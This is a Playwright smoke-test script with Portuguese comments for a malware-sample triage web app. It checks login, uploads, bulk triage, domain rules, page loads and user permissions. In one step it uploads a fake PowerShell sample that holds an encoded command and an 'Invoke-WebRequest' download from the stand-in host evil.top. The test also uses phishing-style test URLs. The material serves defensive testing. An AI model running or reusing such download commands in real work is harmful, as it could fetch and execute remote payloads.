// Roteiro do teste rapido contra a API real (item 124): roda pelo
// apps/api/tests/smoke.mjs, nao pela suite de telas. Faz o caminho principal e abre
// as telas; erro inesperado da API, no console ou da CSP reprova.
import { randomBytes } from 'node:crypto';

import { chromium } from 'playwright';

const ORIGIN = process.env.SMOKE_URL;
const ADMIN_EMAIL = process.env.SMOKE_ADMIN_EMAIL;
const ADMIN_PASSWORD = process.env.SMOKE_ADMIN_PASSWORD;
const NEW_PASSWORD = 'Nova-Senha-Forte-77!';
const OUT = 'out';
const RESOLUTION = 'Seguro: pode abrir.';

let failures = 0;
const expect = (label, ok, detail = '') => {
  if (!ok) failures += 1;
  console.log(`${ok ? 'ok  ' : 'FALHA'} ${label}${!ok && detail ? ` (${detail})` : ''}`);
};

/** Respostas de erro que fazem parte do fluxo; o resto reprova. */
const EXPECTED = new Set(['GET /api/auth/me 401']);

const browser = await chromium.launch();

/** Contexto que anota tudo o que deu errado na tela em andamento. */
async function newSession() {
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  const page = await context.newPage();
  const session = { context, page, problems: [] };
  page.on('pageerror', (err) => session.problems.push(`erro na página: ${err.message}`));
  page.on('console', (msg) => {
    // 4xx/5xx aparecem como "Failed to load resource": quem julga e a resposta abaixo.
    if (msg.type() === 'error' && !msg.text().startsWith('Failed to load resource')) {
      session.problems.push(`console: ${msg.text().slice(0, 300)}`);
    }
  });
  page.on('response', (res) => {
    const { pathname } = new URL(res.url());
    if (!pathname.startsWith('/api/') || res.status() < 400) return;
    const call = `${res.request().method()} ${pathname} ${res.status()}`;
    if (!EXPECTED.has(call)) session.problems.push(`API: ${call}`);
  });
  return session;
}

/** Devolve e limpa o que deu errado ate aqui. */
const drain = (session) => session.problems.splice(0).join(' | ');

/** Abre a tela: sem erro anotado e sem mensagem de erro para a pessoa. */
async function visit(session, path) {
  const { page } = session;
  await page.goto(ORIGIN + path, { waitUntil: 'networkidle' });
  const shown = await page.locator('.hpsm-msg--error .hpsm-msg__text').allInnerTexts();
  const problems = [drain(session), ...shown].filter(Boolean).join(' | ');
  expect(`tela ${path}`, !problems, problems);
}

const api = async (session, method, path, data) => {
  const res = await session.context.request.fetch(ORIGIN + path, { method, data });
  return { status: res.status(), body: await res.json().catch(() => null) };
};

const admin = await newSession();
let userSession = null;
try {
  const { page } = admin;

  // 1. Primeiro acesso: login, troca obrigatoria da senha, entra no sistema.
  await page.goto(ORIGIN + '/login', { waitUntil: 'networkidle' });
  await page.fill('#email', ADMIN_EMAIL);
  await page.fill('#password', ADMIN_PASSWORD);
  await page.click('button[type=submit]');
  await page.waitForSelector('#force-new');
  expect('login pede a troca de senha', true);
  await page.fill('#force-new', NEW_PASSWORD);
  await page.fill('#force-confirm', NEW_PASSWORD);
  await page.click('button[type=submit]');
  await page.waitForSelector('.hpsm-tree');
  expect('troca a senha e entra', !drain(admin));

  // 2. Envio: a amostra chega analisada e a tela mostra o que a API devolveu.
  await page.goto(ORIGIN + '/submit', { waitUntil: 'networkidle' });
  await page.setInputFiles('input[type=file]', {
    name: 'fatura.ps1',
    mimeType: 'text/plain',
    buffer: Buffer.from('powershell -enc QQBCAEMA\nInvoke-WebRequest http://evil.top/a\n'),
  });
  await page.fill('#file-title', 'Fatura suspeita');
  await page.click('button:has-text("Enviar arquivo")');
  await page.waitForURL(/\/entries\/[^/?]+/);
  const entryId = new URL(page.url()).pathname.split('/').pop();
  await page.waitForSelector('.hpsm-section__head:has-text("Script (")');
  expect('envio abre a ficha', (await page.locator('body').innerText()).includes('Fatura suspeita'));
  const section = await page.locator('.hpsm-section__head:has-text("Script (")').innerText();
  expect('ficha mostra a análise do script', /powershell/i.test(section), section);
  const sent = (await api(admin, 'GET', `/api/entries/${entryId}`)).body?.entry;
  expect('análise feita na chegada', Boolean(sent?.staticInfo?.script), JSON.stringify(sent?.staticInfo));
  for (const tab of ['detalhes', 'analise', 'relatorios', 'relacionadas', 'mapa', 'historico']) {
    await visit(admin, `/entries/${entryId}?tab=${tab}`);
  }

  // 3. Triagem em massa, conferida na API.
  await visit(admin, '/history');
  await page.locator('tbody tr').first().locator('input[type=checkbox]').check();
  await page.selectOption('#bulk-status', 'IN_REVIEW');
  await page.selectOption('#bulk-priority', 'P2');
  await page.fill('#bulk-resolution', RESOLUTION);
  await page.locator('.hpsm-bulkbar button:has-text("Aplicar")').click();
  await page.locator('[role=alertdialog] button:has-text("Atualizar")').click();
  await page.waitForSelector('.hpsm-msg--success');
  const triaged = (await api(admin, 'GET', `/api/entries/${entryId}`)).body?.entry;
  expect(
    'atualização em massa gravada',
    triaged?.status === 'IN_REVIEW' && triaged?.priority === 'P2' && triaged?.resolution === RESOLUTION,
    JSON.stringify({ status: triaged?.status, priority: triaged?.priority, resolution: triaged?.resolution }),
  );
  const csv = await (await admin.context.request.get(`${ORIGIN}/api/entries/export.csv`)).text();
  expect('resolução no CSV', csv.includes('Resolução') && csv.includes(RESOLUTION));
  expect('sem erro na triagem', !drain(admin));

  // 3a. Envio grande: limite real na ajuda, percentual e titulo da aba do navegador.
  await visit(admin, '/submit');
  expect('título da aba do navegador', (await page.title()) === 'Enviar Amostra · DeepLook', await page.title());
  const help = await page.locator('.hpsm-field__help').first().innerText();
  expect('limite real na ajuda', help.includes('com até 200 MB cada'), help);
  await page.setInputFiles('input[type=file]', {
    name: 'grande.bin',
    mimeType: 'application/octet-stream',
    buffer: randomBytes(8 * 1024 * 1024),
  });
  await page.waitForSelector('button:has-text("Enviar arquivo"):not([disabled])');
  await page.evaluate(() => {
    window.__seen = [];
    new MutationObserver(() => {
      const found = document.body.innerText.match(/Enviando\.\.\. \d+%|Analisando o arquivo/);
      if (found) window.__seen.push(found[0]);
    }).observe(document.body, { subtree: true, childList: true, characterData: true });
  });
  // Rede local e rapida demais para ver o percentual: envio limitado a 2 MB/s.
  const cdp = await admin.context.newCDPSession(page);
  await cdp.send('Network.emulateNetworkConditions', {
    offline: false,
    latency: 0,
    downloadThroughput: -1,
    uploadThroughput: 2 * 1024 * 1024,
  });
  await page.click('button:has-text("Enviar arquivo")');
  await page.waitForURL(/\/entries\/[^/?]+/);
  await cdp.detach();
  const seen = await page.evaluate(() => window.__seen);
  expect('envio mostra o percentual', seen.some((t) => /\d+%/.test(t)), JSON.stringify(seen));
  expect('depois do envio, analisando', seen.includes('Analisando o arquivo'), JSON.stringify(seen));
  console.log(`     andamento visto: ${[...new Set(seen)].slice(0, 6).join(' > ')}`);
  await page.waitForLoadState('networkidle');
  expect('envio grande sem erro', !drain(admin));

  // 3b. Regra "dominio parecido" pela tela vale na chegada de um link.
  const domain = await api(admin, 'POST', '/api/company-domains', { domain: 'empresa.com.br' });
  expect('cadastra domínio da empresa', domain.status === 201, JSON.stringify(domain));
  await visit(admin, '/regras-triagem');
  await page.selectOption('#rule-condition', 'LOOKALIKE');
  await page.fill('#rule-name', 'Parecido com a empresa');
  await page.fill('#rule-tags', 'dominio-parecido');
  await page.click('button:has-text("Incluir regra")');
  await page.waitForSelector('tbody tr:has-text("Parecido com a empresa")');
  const link = await api(admin, 'POST', '/api/entries/url', {
    url: 'http://ernpresa.com.br/entrar',
    title: 'Parecido com a empresa',
  });
  const tagged = (await api(admin, 'GET', `/api/entries/${link.body?.entry?.id}`)).body?.entry;
  expect(
    'regra de domínio parecido na chegada',
    tagged?.tags?.some((t) => t.name === 'dominio-parecido'),
    JSON.stringify(tagged?.tags),
  );

  // 3c. Pasta recolhida no Navegador: gravada de verdade e de volta ao recarregar.
  const folderHead = page.locator('.hpsm-tree button:has-text("Gestão")');
  const saved = page.waitForResponse((r) => r.url().endsWith('/api/me/preferences') && r.request().method() === 'PATCH');
  await folderHead.click();
  expect('grava a pasta recolhida', (await saved).status() === 200);
  await page.reload({ waitUntil: 'networkidle' });
  expect('pasta continua recolhida', (await folderHead.getAttribute('aria-expanded')) === 'false');
  await folderHead.click();

  // 4. Telas do admin.
  for (const path of [
    '/inicio',
    '/user',
    '/user/api',
    '/history',
    '/me',
    '/submit',
    '/inbox',
    '/casos',
    '/busca',
    '/kb',
    '/kb/novo',
    '/painel',
    '/revisoes',
    '/comparar',
    '/permitidos',
    '/atribuicao',
    '/gerencial',
    '/avisos',
    '/dominios-empresa',
    '/regras-triagem',
    '/yara',
    `/entries/${entryId}/imprimir`,
    '/gerencial/imprimir',
  ]) {
    await visit(admin, path);
  }
  for (const tab of ['users', 'keys', 'tokens', 'templates', 'status', 'audit', 'trash', 'backup']) {
    await visit(admin, `/admin?tab=${tab}`);
  }

  // 5. Usuario comum: cadastro com chave de ativacao, envio e telas dele.
  const created = await api(admin, 'POST', '/api/admin/activation-keys', { role: 'USER' });
  const code = created.body?.key?.code;
  expect('admin gera a chave de ativação', created.status === 201 && Boolean(code), JSON.stringify(created));
  userSession = await newSession();
  const user = userSession.page;
  await user.goto(ORIGIN + '/register', { waitUntil: 'networkidle' });
  await user.fill('#displayName', 'Pessoa Comum');
  await user.fill('#email', 'comum@x.io');
  await user.fill('#password', NEW_PASSWORD);
  await user.fill('#confirmPassword', NEW_PASSWORD);
  await user.fill('#activationKey', code);
  await user.click('button[type=submit]');
  await user.waitForSelector('.hpsm-tree');
  expect('cadastro entra no sistema', !drain(userSession));
  await visit(userSession, '/submit');
  await user.locator('[role=tab]:has-text("Link"), button:has-text("Link")').first().click();
  await user.fill('#url', 'http://login.banco-falso.top/entrar');
  await user.fill('#url-title', 'Link estranho');
  await user.click('button:has-text("Enviar link")');
  await user.waitForURL(/\/entries\/[^/?]+/);
  await user.waitForLoadState('networkidle');
  expect('usuário comum envia link', !drain(userSession));
  for (const path of ['/inicio', '/user', '/user/api', '/history', '/me', '/inbox', '/busca', '/kb', '/painel']) {
    await visit(userSession, path);
  }
  for (const path of ['/admin', '/yara', '/casos', '/regras-triagem', '/revisoes']) {
    await user.goto(ORIGIN + path, { waitUntil: 'networkidle' });
    expect(`usuário comum fora de ${path}`, new URL(user.url()).pathname !== path);
  }
  await visit(userSession, `/entries/${entryId}`);
  const other = await user.locator('body').innerText();
  expect('amostra de outra pessoa com a resolução', other.includes(RESOLUTION));
  expect('amostra de outra pessoa sem o e-mail', !other.includes(ADMIN_EMAIL));
  expect('amostra de outra pessoa sem baixar', !other.includes('Baixar amostra'));
  expect('API recusa o download', (await api(userSession, 'GET', `/api/entries/${entryId}/download`)).status === 403);

  // 6. Sair: a sessao acaba de verdade.
  const out = await api(userSession, 'POST', '/api/auth/logout');
  expect('sair', out.status === 200, JSON.stringify(out));
  expect('sem sessão depois de sair', (await api(userSession, 'GET', '/api/entries')).status === 401);
} catch (err) {
  expect('roteiro até o fim', false, err.message);
  await admin.page.screenshot({ path: `${OUT}/smoke-admin.png`, fullPage: true }).catch(() => undefined);
  await userSession?.page.screenshot({ path: `${OUT}/smoke-usuario.png`, fullPage: true }).catch(() => undefined);
}
const left = [drain(admin), userSession ? drain(userSession) : ''].filter(Boolean).join(' | ');
expect('nada pendente no fim', !left, left);

await browser.close();
console.log(failures ? `\n${failures} falha(s)` : '\nteste rápido: tudo ok');
process.exit(failures ? 1 : 0);
